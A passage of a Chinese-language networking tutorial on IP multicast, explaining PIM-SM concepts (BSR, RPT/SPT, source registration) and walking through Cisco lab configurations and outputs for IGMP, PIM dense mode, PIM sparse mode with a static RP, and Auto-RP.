Router），BSR是PIM-SM网络的管理核心，负责收集网络中的Candidate-RP（C-RP）发来的Advertisment宣告信息，然后将为每个组播组选择部分C-RP信息以组成RP-Set集(即组播组和RP的映射库),并发布到整个PIM-SM网络，从而网络内所有的路由器都知道RP和BSR位置。一个网络的内部只能选举出一个BSR，但可以配置多个Candidate-BSR（C-BSR），这样一旦BSR发生故障，其余C-BSR能够自动选举出新的BSR。同样一个PIM-SM域内可以有多个C-RP，由BSR机制计算出每个组播组对应的RP。 RPT生成：当接收者路由一端向RP发送jion加入信息所经过的每一个路由节点时，都会向转发表中加入（,G）表项，这些沿途经过的路由器就形成了RP的共享树（RPT）的一个分支。其中（，G）表示从任意源来的消息去往组播组G。RPT共享树以RP为根，接收者为叶子。当从组播源发往组播组G的报文流经RP时，报文就会沿着已经建立好的RPT共享树路径到达叶子路由器，进而到达接受者。当某个接受者退出组播组G时，接收者一方的DR会逆着RPT树，朝RP方向逐跳发送Prune剪枝消息。第一个上游路由器接收到该剪枝消息，在其出接口列表中删除链接此下游路由器的接口，并检查下游是否还存在组播组G成员，如果没有则继续向上游转发该剪枝消息。 组播源注册：为了向RP通知组播源S的存在，当组播源S向组播组G发送的一个组播组报文时，与组播源S直接相连的路由器收到该报文后，就将该报文封装成Register注册报文，并单播发送给对应的RP。当RP收到来自组播组的注册消息后，一方面解除封装注册消息并将组播消息沿着RPT树发到接收者，另一方面朝组播源逐跳发送（S，G）加入消息，从而让RP和组播组S之间的所有路由器都生成（S，G）表项，这些沿途经过的路由就形成了SPT树的一个根，以RP为目的地。组播源S发出的组播信息沿着已经建立好的SPT树到达RP，然后由RP将信息沿着RPT共享树进行转发。当RP收到沿着SPT树转发的组播流量后，向从与组播源的S直连路由器的单播发送注册停止报文。组播源注册过程结束。 RPT向SPT切换：PIM-SM通过指定一个利用带宽的SPT阈值可以实现将最后一跳路由器（即离接收者近的DR）从RPT切换为SPT。当最后一跳路由器发现从RP发往组播组G的组播报文速率超过了阈值时，就向单播路由器表中到组播源S的下一跳路由器发送（S，G）加入消息，加入消息经过一个个路由器后到达第一跳路由器（即离组播源最近的DR），沿途经过的所有路由器都拥有了（S，G）表项，从而建立SPT树分支。随后，最后一跳路由器向RP逐跳发送包含RP为的Prune剪枝消息，RP收到消息后向组播源反向转发Prune剪枝消息。从而实现组播信息流从RPT切换到SPT。切换到SPT后，组播源S直接发送信息到接收者。 组播和单播的区别: 为了让网络中的多个主机可以同时接受到相同的报文，如果采用单播的方式，那么源主机必须不停的产生多个相同的报文来进行发送，对于一些对时延很敏感的数据，在源主机要产生多个相同的数据报文后，在产生第二个数据报文，这通常是无法容忍的。而且对于。一台主机来说，同时不停的产生一个报文来说也是一个很大的负担。如果采用组播的方式，源主机可以只需要发送一个报文就可以到达每个需要接受的主机上，这中间还要取决于路由器对组员和组关系的维护和选择。 组播和广播的区别:当有多台主机想要接收相同的报文，广播采用的方式是把报文传送到局域网内每个主机上，不管这个主机是否对报文感兴趣。这样做就会造成了带宽的浪费和主机的资源浪费。而组播有一套对组员和组之间关系维护的机制，可以明确的知道在某个子网中，是否有主机对这类组播报文感兴趣，如果没有就不会把报文进行转发，并会通知上游路由器不要再转发这类报文到下游路由器上。 组播的优点： 需要相同数据流的客户端加入相同的组共享一条数据流，节省了服务器的负载。具备广播所具备的优点。 由于组播协议是根据接受者的需要对数据流进行复制转发，所以服务端的服务总带宽不受客户接入端带宽的限制。IP协议允许有2亿6千多万个组播，所以其提供的服务可以非常丰富。 此协议和单播协议一样允许在Internet宽带网上传输。 组播的缺点： 与单播协议相比没有纠错机制，发生丢包错包后难以弥补，但可以通过一定的容错机制和QOS加以弥补。 现行网络虽然都支持组播的传输，但在客户认证、QOS等方面还需要完善，这些缺点在理论上都有成熟的解决方案，只是需要逐步推广应用到现存网络当中。 实验一、组播中的IGMP PC1配置 Router&gt;en Router#conf t PC2(config)#no ip routing //禁止路由功能，让路由器作为主机 Router#hostname PC1 PC1(config)#ip default-gateway192.168.1.1 //指定网关 PC1(config)#int fa0/0 PC1(config-if)#ip add 192.168.1.3255.255.255.0 PC1(config-if)#ip igmp join-group224.1.1.1 //利用IGMP协议指定加入组播组的地址 PC1(config-if)#no sh PC1(config-if)#exit PC2配置： Router&gt;en Router#conf t Router(config)#hostname PC2 PC2(config)#no ip routing PC2(config)#ip default-gateway192.168.1.1 PC2(config)#int fa0/0 PC2(config-if)#ip add 192.168.1.2255.255.255.0 PC2(config-if)#ip igmp join-group224.1.1.1 PC2(config-if)#no sh PC2(config-if)#exit PC3配置： Router&gt;en Router#conf t Router(config)#hostname PC3 PC3(config)#no ip routing PC3(config)#ip default-gateway192.168.1.1 PC3(config)#int fa0/0 PC3(config-if)#ip add 192.168.1.4 255.255.255.0 PC3(config-if)#ip igmp join-group224.1.1.1 PC3(config-if)#no sh PC3(config-if)#exit SW配置： R4配置： Router&gt;en Router#conf t Router(config)#hostname R4 R4(config)#ip multicast-routing //开启组播路由协议 R4(config)#int fa0/0 R4(config-if)#ip add 192.168.1.1255.255.255.0 R4(config-if)#ip pim sparse-mode //端口下指定组播路由协议的模式为密集型 R4(config-if)#no sh R5配置: Router&gt;en Router#conf t Router(config)#hostname R5 R5(config)#ip multicast-routing R5(config)#int fa0/0 R5(config-if)#ip add 192.168.1.5255.255.255.0 R5(config-if)#ip pim sparse-mode R5(config-if)#no sh 第一完成配置后查看，主机是否加入了组播组，路由器是否正常 R4#sh ip igmp groups //R4查看组播组 IGMP Connected Group Membership Group Address Interface Uptime Expires Last Reporter Group Accounted 224.1.1.1 FastEthernet0/0 00:02:06 00:02:51 192.168.1.3 224.0.1.40 FastEthernet0/0 00:14:31 00:02:52 192.168.1.5 R4#sh ip igmp interface //查看谁是查询器，谁是DR。IP地址小的成为DR FastEthernet0/0 is up, line protocol isup Internet address is 192.168.1.1/24 IGMP is enabled on interface Current IGMP host version is 2 Current IGMP router version is 2 IGMP query interval is 60 seconds IGMP querier timeout is 120 seconds IGMP max query response time is 10 seconds Last member query count is 2 Last member query response interval is 1000 ms Inbound IGMP access group is not set IGMP activity: 2 joins, 0 leaves Multicast routing is enabled on interface Multicast TTL threshold is 0 Multicast designatedrouter (DR) is 192.168.1.5 //R5是D5 IGMP querying routeris 192.168.1.1 (this system) //R4是查询器发送查询报文 Multicast groups joined by this system (number of users): 224.0.1.40(1) R4#debug ip igmp//调试IGMP报文 IGMP debugging is on *Mar 1 00:22:00.683: IGMP(0): Send v2 generalQuery on FastEthernet0/0 // 发送查询报文 *Mar 1 00:22:00.683: IGMP(0): Set report delay time to 9.8 seconds for224.0.1.40 on FastEthernet0/0 *Mar 1 00:22:03.663: IGMP(0): Received v2 Reporton FastEthernet0/0 from 192.168.1.3 for 224.1.1.1 //主机发送加入组播组的报文 *Mar 1 00:22:03.667: IGMP(0): Received Group record for group 224.1.1.1, mode2 from 192.168.1.3 for 0 sources *Mar 100:22:03.667: IGMP(0): Updating EXCLUDE group timer for 224.1.1.1 Mar 1 00:22:03.671: IGMP(0): MRT Add/Update FastEthernet0/0 for(,224.1.1.1) by 0 *Mar 1 00:22:09.403: IGMP(0): Received v2 Report on FastEthernet0/0 from192.168.1.5 for 224.0.1.40 *Mar 1 00:22:09.403: IGMP(0): Received Group record for group 224.0.1.40,mode 2 from 192.168.1.5 for 0 sources *Mar 1 00:22:09.403: IGMP(0): Cancel report for 224.0.1.40 on FastEthernet0/0 *Mar 1 00:22:09.403: IGMP(0): Updating EXCLUDE group timer for 224.0.1.40 Mar 1 00:22:09.403: IGMP(0): MRT Add/Update FastEthernet0/0 for(,224.0.1.40) by 0 第二先把PC3离开组播组，观察R4变化 PC3#conf t PC3(config)#int fa0/0 PC3(config-if)#no ip igmp join-group224.1.1.1 //PC3离开组播组224.1.1.1 R4#conf t R4#debug ip igmp //调试R4的IGMP包 IGMP debugging is on *Mar 1 01:27:24.091: IGMP(0): Received Leave from192.168.1.4 (FastEthernet0/0) for 224.1.1.1//PC3发给R4离开组播组的报文 *Mar 1 01:27:24.095: IGMP(0): Received Group record for group 224.1.1.1, mode3 from 192.168.1.4 for 0 sources *Mar 1 01:27:24.095: IGMP(0): Lower expirationtimer to 2000 msec for 224.1.1.1 on FastEthernet0/0//将组播组224.1.1.1的超时时间设置为2000msec， *Mar 1 01:27:24.095: IGMP(0): Send v2 Query onFastEthernet0/0 for group 224.1.1.1 *Mar 1 01:27:25.099: IGMP(0): Send v2 Query onFastEthernet0/0 for group 224.1.1.1 *Mar 1 01:27:26.099: IGMP(0): Switching to INCLUDEmode for 224.1.1.1 on FastEthernet0/0 //R4连续发了两个特定组查询消息（Group-Specific Query），试图通过这种方式确认224.1.1.1组中是否有其他组员了，并且将组播组转换到收录模式 *Mar 1 01:27:26.575: IGMP(0): Received v2 Reporton FastEthernet0/0 from 192.168.1.3 for 224.1.1.1 *Mar 1 01:27:26.575: IGMP(0): Received Grouprecord for group 224.1.1.1, mode 2 from 192.168.1.3 for 0 sources *Mar 1 01:27:26.579: IGMP(0): WAVL Insert group:224.1.1.1 interface: FastEthernet0/0Successful *Mar 1 01:27:26.579: IGMP(0): Switching to EXCLUDEmode for 224.1.1.1 on FastEthernet0/0 *Mar 1 01:27:26.583: IGMP(0): Updating EXCLUDEgroup timer for 224.1.1.1 Mar 1 01:27:26.583: IGMP(0): MRT Add/UpdateFastEthernet0/0 for (,224.1.1.1) by 0 //一个成员回复了查询以便通告自己的存在。R4知道组224.1.1.1里仍有组成员存在，马上回复组播组到正常状态。 第三IGMPSnooping限制交换机网络中多播的流量。对交换机的工作模式是它会学习接收到的所有帧的源MAC地址，并存入交换机的MAC地址表，而多播MAC地址永远不会作为一个数据包的源MAC地址（一般都是作为目的MAC地址）所以交换机永远不会将多播MAC地址存入MAC地址表中，所以，每次收到的多播流量都会以泛洪的形式发送出去。由于默认情况下，局域网交换机会在广播域中泛洪多播流量，这会消耗大量的带宽。Cisco Group Management Protocol (CGMP)和 Internet GroupManagement Protocol (IGMP) snooping 主要是用来限制交换机网络中多播的流量。 解决交换机的带宽问题有3种方法： 在交换机上配置静态的多播MAC地址到用户接口的映射 使用CGMP，运行CGMP的多播路由器能够将用户发送给自己的IGMP报文再通知给交换机 使用IGMPSnooping，在这种模式下交换机会自己截取客户发送的IGMP消息，并根据IGMP消息更新自己的MAC地址表 使用IGMPproxy的二层网络设备，对用户侧承担Server的角色，定期查询用户信息，对于网络路由侧又承担Client的角色，在需要时将当前的用户信息发送给网络.不仅能够达到抑制二层组播泛滥的目的更能有效地获取和控制用户信息,同时在减少网络侧协议消息以降低网络负荷方面起到一定作用。 IGMP运行于主机和与主机直连的路由器之间，其实现的功能是双向的：一方面，主机通过IGMP通知路由器希望接收某个特定组播组的信息；另一方面，路由器通过IGMP周期性地查询局域网内的组播组成员是否处于活动状态，实现所连网段组成员关系的收集与维护。总之：IGMP是TCP/IP协议族中负责IP组播组成员管理的协议，用来在IP主机和与其直接相邻的组播路由器之间建立、维护组播组成员关系。 IGMP Snooping是运行在二层设备上的组播约束机制，用于管理和控制组播组。运行IGMP Snooping的二层设备通过对收到的IGMP报文进行分析，为二层端口和组播MAC地址建立起映射关系，并根据这个映射关系转发组播数据。 在传统的组播点播方式下，当连接在二层设备上、属于不同VLAN的用户分别进行组播点播时，三层组播设备需要向该二层设备的每个VLAN分别发送一份组播数据；而当二层设备运行了组播VLAN之后，三层组播设备只需向该二层设备的组播VLAN发送一份组播数据即可，从而既避免了带宽的浪费，也减轻了三层组播设备的负担。 实验二、组播的PIM-DM模式(Dense-mode) Server配置： Server#conf t Server(config)#no ip routing Server(config)#ip default-gateway 192.168.5.1 Server(config)#int e0/0 Server(config-if)#ip add 192.168.5.2255.255.255.0 Server(config-if)#no sh Server(config-if)#exit R5配置： R5#conf t R5(config)#ip multicast-routing R5(config)#int e0/0 R5(config-if)#ip add 12.168.5.1 255.255.255.0 R5(config-if)#ippim dense-mode R5(config-if)#no sh R5(config-if)#exit R5(config)#int e0/1 R5(config-if)#ip add 192.168.51.5255.255.255.0 tR5(config-if)#ip pim dense-mode R5(config-if)#no sh R5(config-if)#exit R5(config)#int e0/2 R5(config-if)#ip add 192.168.52.5255.255.255.0 R5(config-if)#ip pim dense-mode R5(config-if)#no sh R5(config-if)#exit R5(config)#router ospf 1 R5(config-router)#net 0.0.0.0 0.0.0.0 area 0 R5(config-router)#exit R1配置： R1#conf t R1(config)#ip multicast-routing R1(config)#int e0/0 R1(config-if)#ip add 192.168.51.1255.255.255.0 R1(config-if)#ip pim dens R1(config-if)#ip pim dense-mode R1(config-if)#no sh R1(config-if)#exit R1(config)#int e0/1 R1(config-if)#ip add 192.168.13.1255.255.255.0 R1(config-if)#ip pim den R1(config-if)#ip pim dense-mode R1(config-if)#no sh R1(config-if)#exit R1(config)#router ospf 1 R1(config-router)#net 0.0.0.0 0.0.0.0 area 0 R1(config-router)#exit R2配置： R2#conf t R2(config)#ip multicast-routing R2(config)#int e0/0 R2(config-if)#ip add 192.168.52.2255.255.255.0 R2(config-if)#ip pim den R2(config-if)#ip pim dense-mode R2(config-if)#no sh R2(config-if)#exit R2(config)#int e0/1 R2(config-if)#ip add 192.168.24.2255.255.255.0 R2(config-if)#ip pim dense-mode R2(config-if)#no sh R2(config-if)#exit R2(config)#router ospf 1 R2(config-router)#net 0.0.0.0 0.0.0.0 area 0 R2(config-router)#exit R3配置： R3#conf t R3(config)#ip multicast-routing R3(config)#int e0/1 R3(config-if)#ip add 192.168.13.3255.255.255.0 R3(config-if)#ip pim dense-mode R3(config-if)#no sh R3(config-if)#exit R3(config)#int e0/0 R3(config-if)#ip add 192.168.0.1255.255.255.0 R3(config-if)#ip pim dense-mode R3(config-if)#no sh R3(config-if)#exit R3(config)#router ospf 1 R3(config-router)#net 0.0.0.0 0.0.0.0 area 0 R3(config-router)#exit 配置R4 R4#conf t R4(config)#ip multicast-routing R4(config)#int e0/0 R4(config-if)#ip add 192.168.0.2255.255.255.0 R4(config-if)#ip pim dense-mode R4(config-if)#no sh R4(config-if)#exit R4(config)#int e0/1 R4(config-if)#ip add 192.168.24.4255.255.255.0 R4(config-if)#ip pim den R4(config-if)#ip pim dense-mode R4(config-if)#no sh R4(config-if)#exit R4(config)#int e0/2 R4(config-if)#ip add 192.168.46.4255.255.255.0 R4(config-if)#ip pim dense-mode R4(config-if)#no sh R4(config-if)#exit R4(config)#router ospf 1 R4(config-router)#net 0.0.0.0 0.0.0.0 area 0 R4(config-router)#exit 配置R6 R6#conf t R6(config)#ip multicast-routing R6(config)#int e0/0 R6(config-if)#ip add 192.168.46.6255.255.255.0 R6(config-if)#ip pim dense-mode R6(config-if)#no sh R6(config-if)#exit R6(config)#router ospf 1 R6(config-router)#net 0.0.0.0 0.0.0.0 area 0 R6(config-router)#exit PC1配置： PC1#conf t PC1(config)#no ip routing PC1(config)#ip default-gateway 192.168.0.1 PC1(config)#int e0/0 PC1(config-if)#ip add 192.168.0.5255.255.255.0 PC1(config-if)#ip igmp join-group 224.1.1.1 PC1(config-if)#no sh PC1(config-if)#exit 完成以上配置后：所有路由器的多播路由表如下： R2#sh ip mroute //PIM-DM需要有组播流才形成树 IP Multicast Routing Table Flags: D - Dense, S - Sparse, B - BidirGroup, s - SSM Group, C - Connected, L - Local, P - Pruned, R - RP-bit set, F - Register flag, T - SPT-bit set, J - Join SPT, M - MSDP created entry, X - Proxy Join Timer Running, A - Candidatefor MSDP Advertisement, U - URD, I - Received Source Specific Host Report, Z - Multicast Tunnel, z - MDT-data group sender, Y - Joined MDT-data group, y - Sending to MDT-data group Outgoing interface flags: H - Hardwareswitched, A - Assert winner Timers: Uptime/Expires Interface state: Interface, Next-Hop or VCD,State/Mode (*, 224.0.1.40), 00:33:39/00:02:51, RP0.0.0.0, flags: DCL Incoming interface: Null, RPF nbr 0.0.0.0 Outgoinginterface list: Ethernet0/1, Forward/Dense, 00:27:46/00:00:00 Ethernet0/0, Forward/Dense, 00:33:39/00:00:00 接着在Server端Ping 224.1.1.1 组播组，发现变化 Server#ping224.1.1.1 repeat 100 //注意有了组播源才有路，ping结束后路也消失 Type escapesequence to abort. Sending 100,100-byte ICMP Echos to 224.1.1.1, timeout is 2 seconds: ……………………………………… Reply torequest 45 from 192.168.0.5, 264 ms Reply torequest 46 from 192.168.0.5, 248 ms Reply torequest 47 from 192.168.0.5, 204 ms R1#sh ipmroute //R1没有SPT IP MulticastRouting Table Flags: D -Dense, S - Sparse, B - Bidir Group, s - SSM Group, C - Connected, L - Local, P - Pruned, R - RP-bit set, F- Register flag, T - SPT-bit set, J - Join SPT, M - MSDPcreated entry, X - Proxy Join Timer Running, A -Candidate for MSDP Advertisement, U - URD, I - Received Source SpecificHost Report, Z - Multicast Tunnel, z - MDT-data groupsender, Y - Joined MDT-data group, y - Sendingto MDT-data group Outgoinginterface flags: H - Hardware switched, A - Assert winner Timers: Uptime/Expires Interface state: Interface, Next-Hop or VCD,State/Mode (*,224.0.1.40), 00:39:13/00:02:24, RP 0.0.0.0, flags: DCL Incoming interface: Null, RPF nbr 0.0.0.0 Outgoing interface list: Ethernet0/1, Forward/Dense,00:33:20/00:00:00 Ethernet0/0,Forward/Dense, 00:39:13/00:00:00 R2#sh ipmroute //R2生成了SPT IP MulticastRouting Table Flags: D -Dense, S - Sparse, B - Bidir Group, s - SSM Group, C - Connected, L - Local, P - Pruned, R - RP-bit set, F- Register flag, T - SPT-bit set, J - Join SPT, M - MSDPcreated entry, X - Proxy Join Timer Running, A -Candidate for MSDP Advertisement, U - URD, I - Received Source SpecificHost Report, Z- Multicast Tunnel, z - MDT-data group sender, Y - Joined MDT-data group, y - Sendingto MDT-data group Outgoinginterface flags: H - Hardware switched, A - Assert winner Timers: Uptime/Expires Interface state: Interface, Next-Hop or VCD,State/Mode (*, 224.1.1.1), 00:06:24/stopped,RP 0.0.0.0, flags: D Incoming interface: Null, RPF nbr 0.0.0.0 Outgoing interface list: Ethernet0/1, Forward/Dense, 00:06:24/00:00:00 Ethernet0/0,Forward/Dense, 00:06:24/00:00:00 (192.168.5.2, 224.1.1.1), 00:06:24/00:00:09,flags: T Incoming interface: Ethernet0/0, RPF nbr 192.168.52.5 Outgoing interface list: Ethernet0/1, Forward/Dense, 00:06:27/00:00:00 (*,224.0.1.40), 00:32:25/00:02:34, RP 0.0.0.0, flags: DCL Incoming interface: Null, RPF nbr 0.0.0.0 Outgoing interface list: Ethernet0/1, Forward/Dense,00:25:04/00:00:00 Ethernet0/0, Forward/Dense, 00:32:25/00:00:00 R4#sh ipmroute //R4链接R6的接口会剪枝 IP MulticastRouting Table Flags: D -Dense, S - Sparse, B - Bidir Group, s - SSM Group, C - Connected, L - Local, P - Pruned, R - RP-bit set, F- Register flag, T - SPT-bit set, J - Join SPT, M - MSDPcreated entry, X - Proxy Join Timer Running, A -Candidate for MSDP Advertisement, U - URD, I - Received Source SpecificHost Report, Z - Multicast Tunnel, z - MDT-data groupsender, Y - Joined MDT-data group, y - Sendingto MDT-data group Outgoinginterface flags: H - Hardware switched, A - Assert winner Timers: Uptime/Expires Interface state: Interface, Next-Hop or VCD,State/Mode (*,224.1.1.1), 01:25:39/stopped, RP 0.0.0.0, flags: D Incoming interface: Null, RPF nbr 0.0.0.0 Outgoing interface list: Ethernet0/2, Forward/Dense,01:25:39/00:00:00 Ethernet0/1, Forward/Dense,01:25:39/00:00:00 Ethernet0/0, Forward/Dense,01:25:39/00:00:00 (192.168.5.2,224.1.1.1), 00:00:04/00:02:55, flags: T Incoming interface: Ethernet0/1, RPF nbr192.168.24.2 Outgoing interface list: Ethernet0/0, Forward/Dense,00:00:08/00:00:00 Ethernet0/2, Prune/Dense, 00:00:08/00:02:54 (*,224.0.1.40), 01:32:39/00:02:37, RP 0.0.0.0, flags: DCL Incoming interface: Null, RPF nbr 0.0.0.0 Outgoing interface list: Ethernet0/2, Forward/Dense,01:28:28/00:00:00 Ethernet0/1, Forward/Dense,01:32:08/00:00:00 Ethernet0/0, Forward/Dense,01:32:39/00:00:00 实验三、组播PIM-SM（静态RP、SPT自动切换RPT） Server配置： Server#conft Server(config)#noip routing Server(config)#ipdefault-gateway 192.168.0.1 Server(config)#inte0/0 Server(config-if)#ipadd 192.168.0.2 255.255.255.0 Server(config-if)#nosh Server(config-if)#exit R2配置： R2#conf t R2(config)#ipmulticast-routing R2(config)#ippim rp-address 3.3.3.3 R2(config)#inte0/0 R2(config-if)#ipadd 192.168.0.1 255.255.255.0 R2(config-if)#ippim sparse-mode R2(config-if)#nosh R2(config-if)#exit R2(config)#inte0/1 R2(config-if)#ipadd 192.168.23.2 255.255.255.0 R2(config-if)#ippim sparse-mode R2(config-if)#nosh R2(config-if)#exit R2(config)#inte0/2 R2(config-if)#ipadd 192.168.25.2 255.255.255.0 R2(config-if)#nosh R2(config-if)#exit R2(config)#routerospf 1 R2(config-router)#net0.0.0.0 0.0.0.0 area 0 R2(config-router)#exit R3配置： R3#conf t R3(config)#ipmulticast-routing R3(config)#ippim rp-address 3.3.3.3 R3(config)#intlo0 R3(config-if)#ipadd 3.3.3.3 255.255.255.0 R3(config-if)#ippim sparse-mode R3(config-if)#exit R3(config)#inte0/0 R3(config-if)#ipadd 192.168.23.3 255.255.255.0 R3(config-if)#ippim sparse-mode R3(config-if)#nosh R3(config-if)#exit R3(config)#inte0/1 R3(config-if)#ipadd 192.168.34.3 255.255.255.0 R3(config-if)#ippim sparse-mode R3(config-if)#nosh R3(config-if)#exit R3(config)#routerospf 1 R3(config-router)#net0.0.0.0 0.0.0.0 area 0 R3(config-router)#exit R4配置： R4#conf t R4(config)#ipmulticast-routing R4(config)#ippim rp-address 3.3.3.3 R4(config)#inte0/0 R4(config-if)#ipadd 192.168.34.4 255.255.255.0 R4(config-if)#ippim sparse-mode R4(config-if)#nosh R4(config-if)#exit R4(config)#inte0/1 R4(config-if)#ipadd 192.168.46.4 255.255.255.0 R4(config-if)#ippim sparse-mode R4(config-if)#nosh R4(config-if)#exit R4(config)#routerospf 1 R4(config-router)#net0.0.0.0 0.0.0.0 area 0 R4(config-router)#exit R5配置： R5#conf t R5(config)#ipmulticast-routing R5(config)#ippim rp-address 3.3.3.3 R5(config)#inte0/0 R5(config-if)#ipadd 192.168.25.5 255.255.255.0 R5(config-if)#nosh R5(config-if)#exit R5(config)#inte0/1 R5(config-if)#ipadd 192.168.56.5 255.255.255.0 R5(config-if)#nosh R5(config-if)#exit R5(config)#routerospf 1 R5(config-router)#net0.0.0.0 0.0.0.0 area 0 R5(config-router)#exit R6配置： R6#conf t R6(config)#ipmulticast-routing R6(config)#ippim rp-address 3.3.3.3 R6(config)#inte0/1 R6(config-if)#ipadd 192.168.56.6 255.255.255.0 R6(config-if)#nosh R6(config-if)#exit R6(config)#inte0/0 R6(config-if)#ipadd 192.168.46.6 255.255.255.0 R6(config-if)#ippim sparse-mode R6(config-if)#nosh R6(config-if)#exit R6(config)#inte0/1 R6(config-if)#exit R6(config)#inte0/2 R6(config-if)#ipadd 192.168.2.1 255.255.255.0 R6(config-if)#ippim sparse-mode R6(config-if)#nosh R6(config-if)#exit R6(config)#routerospf 1 R6(config-router)#net0.0.0.0 0.0.0.0 area 0 R6(config-router)#exit PC配置： PC#conf t PC(config)#noip routing PC(config)#ipdefault-gateway 192.168.2.1 PC(config)#inte0/0 PC(config-if)#ipadd 192.168.2.2 255.255.255.0 PC(config-if)#ipigmp join-group 224.1.1.1 PC(config-if)#nosh PC(config-if)# 完成以上配置后，在Server端ping 224.1.1.1的组播组地址，进行RP注册，然后查看R3与R6的多播路由： Server#ping224.1.1.1 repeat 100 Type escapesequence to abort. Sending 100,100-byte ICMP Echos to 224.1.1.1, timeout is 2 seconds: Reply torequest 0 from 192.168.2.2, 168 ms Reply torequest 1 from 192.168.2.2, 180 ms R3#sh ip mr //RP中的注册信息 IP MulticastRouting Table Flags: D -Dense, S - Sparse, B - Bidir Group, s - SSM Group, C - Connected, L - Local, P - Pruned, R - RP-bit set, F- Register flag, T - SPT-bit set, J - Join SPT, M - MSDPcreated entry, X - Proxy Join Timer Running, A -Candidate for MSDP Advertisement, U - URD, I - Received Source SpecificHost Report, Z - Multicast Tunnel, z - MDT-data groupsender, Y - Joined MDT-data group, y - Sendingto MDT-data group Outgoinginterface flags: H - Hardware switched, A - Assert winner Timers: Uptime/Expires Interface state: Interface, Next-Hop or VCD,State/Mode (*, 224.1.1.1), 00:17:50/stopped,RP 3.3.3.3, flags: S Incoming interface: Null, RPF nbr 0.0.0.0 Outgoing interface list: Ethernet0/1, Forward/Sparse, 00:06:51/00:02:35 (192.168.0.2, 224.1.1.1),00:17:50/00:03:24, flags: T Incoming interface: Ethernet0/0, RPF nbr 192.168.23.2 Outgoing interface list: Ethernet0/1, Forward/Sparse, 00:06:51/00:02:35 (192.168.46.6, 224.1.1.1),00:00:37/00:02:52, flags: PTX Incoming interface: Ethernet0/1, RPF nbr 192.168.34.4 Outgoing interface list: Null (*,224.0.1.40), 00:55:31/00:02:46, RP 3.3.3.3, flags: SJCL Incoming interface: Null, RPF nbr 0.0.0.0 Outgoing interface list: Ethernet0/1, Forward/Sparse,00:06:53/00:02:55 Ethernet0/0, Forward/Sparse,00:31:20/00:02:43 Loopback0,Forward/Sparse, 00:55:33/00:02:44 R6#sh ip mroute //得到RPT表项，收到第一个组播数据后，就切换了自动切换到SPT IP MulticastRouting Table Flags: D -Dense, S - Sparse, B - Bidir Group, s - SSM Group, C - Connected, L - Local, P - Pruned, R - RP-bit set, F- Register flag, T - SPT-bit set, J - Join SPT, M - MSDPcreated entry, X - Proxy Join Timer Running, A -Candidate for MSDP Advertisement, U - URD, I - Received Source SpecificHost Report, Z - Multicast Tunnel, z - MDT-data groupsender, Y - Joined MDT-data group, y - Sendingto MDT-data group Outgoinginterface flags: H - Hardware switched, A - Assert winner Timers: Uptime/Expires Interface state: Interface, Next-Hop or VCD,State/Mode (*, 224.1.1.1), 00:44:24/stopped,RP 3.3.3.3, flags: SJCF //RPT 次优路径 Incoming interface: Ethernet0/0, RPF nbr 192.168.46.4 Outgoing interface list: Ethernet0/2, Forward/Sparse,00:01:30/00:02:30 (192.168.0.2, 224.1.1.1),00:02:45/00:00:14, flags: J //SPT 最优路径 Incoming interface: Null, RPF nbr 192.168.56.5 Outgoing interface list: Ethernet0/2, Forward/Sparse, 00:01:30/00:02:30 (*,224.0.1.40), 00:51:02/00:02:41, RP 3.3.3.3, flags: SJPCL Incoming interface: Ethernet0/0, RPF nbr192.168.46.4 Outgoing interface list: Null RP认为是共享树的根，这和有源树不同，有源树的根一般是组播源所在。在稀疏模式下，所有的组播源数据都会通过Register消息向RP注册，注册后，所有该组播源的数据都发给RP；然后，所有接收者都会发送Join消息到RP，来选择加入哪个组播组接收组播数据。另外PIM-SM还可以在以RP为root建立共享树的同时，每一台PIM-SM路由器都会在自己和组播源之间建立一个SPT，最短路径树，也就是我们在show ip mroute里看到的（S，G）表项。但是静态RP需要在每台PIM路由器上配置，RP也需要配置，因为要让每台路由器都知道谁是RP，但是这种方式不能提供冗余功能的RP，当配置的RP失效后，必须手工更改，否则组播将不能通信。 实验四、思科私有协议PIM-Spare-Dense-Mode（动态Auto-RP） CISCO Auto-RP可以解决静态RP选择不灵活且没有冗余的问题(有备份RP)。要配置Auto-RP的有需要两个角色：candidate RP(RP候选者)、mapping agents收集RP地址信息并向外发送。 RP候选者以224.0.0.39的多播地址向外宣告自己为RP。mapping agents监听这个地址。mapping agents以224.0.0.40向外宣告究竟谁是RP。在3分钟之内如果没有收到任何 rp announce，则认为这个网络没有RP或者RP不可用。过程： candidate rp 宣告自己要做某个组的rp，通告出去采用的ip地址224.0.1.39（默认每60s泛洪一次）（只有MA监听224.0.1.39这个组播地址） MA (mapping agents) 它去决定那个做那个组的rp（看ip地址那个大，但是MA本身没有选举机制，可以存在多个，因为他们选出的RP是一致的，不会影响。），再 以224.0.1.40 的多播组地址通告候选 RP 的信息。末端路由器接收到这个 224.0.1.40 多播组的信息后就可以知道有哪些 RP，并且这些 RP 对应哪些多播组，从而可以自动发现 RP。 （所有运行组播的路由器都监听224.0.1.40这个组，默认每60S一次， holdtime=3x interval） 候选 RP 和 RP 映射代理可以相互独立，不一定属于同一台路由器。但为了可靠起见，而通常将它们合为一体。 Auto-rp中没有对丢失数据包的检测和重传机制，所以auto-rp发现消息的传输是不可靠的。所以一般可以使用多个MA来提供冗余。 RP的选举规则 &lt;/span&gt; 如果RP服务的组播地址完全冲突，（不同RP服务的组播地址范围完全一样）选举ip地址大的为RP。 如果RP服务的组播地址不完全冲突，（不同RP服务的组播地址范围不完全一样）此时acl定义的服务范围小的RP 优先。 对于多个RP MA，不用选举主MA，对于普通路由器，来自MA的消息可以相互覆盖。反正都是一样的。 auto rp 必须运行在sparse-dense-mode模式下，这是cisco的私有标准，如果运行在sparse-mode需要配置ip pim autorp listener。 Server配置： Server#conft Server(config)#noip routing Server(config)#ipdefault-gateway 192.168.1.1 Server(config)#inte0/0 Server(config-if)#ipadd 192.168.1.2 255.255.255.0 Server(config-if)#nosh Server(config-if)#exit R1配置： R1#conf t R1(config)#int e0/0 R1(config-if)#exit R1(config)#ip multicast-routing R1(config)#int e0/0 R1(config-if)#ip add 192.168.1.1 255.255.255.0 R1(config-if)#ip pim sparse-dense-mode R1(config-if)#no sh R1(config-if)#exit R1(config)#int e0/1 R1(config-if)#ip add 192.168.12.1 255.255.255.0 R1(config-if)#ip pim sparse-dense-mode R1(config-if)#no sh R1(config-if)#exit R1(config)#int e0/2 R1(config-if)#ip add 192.168.13.1 255.255.255.0 R1(config-if)#ip pim sparse-dense-mode R1(config-if)#no sh R1(config-if)#exit R1(config)#router ospf 1 R1(config-router)#net 0.0.0.0 0.0.0.0 area 0 R1(config-router)#exit 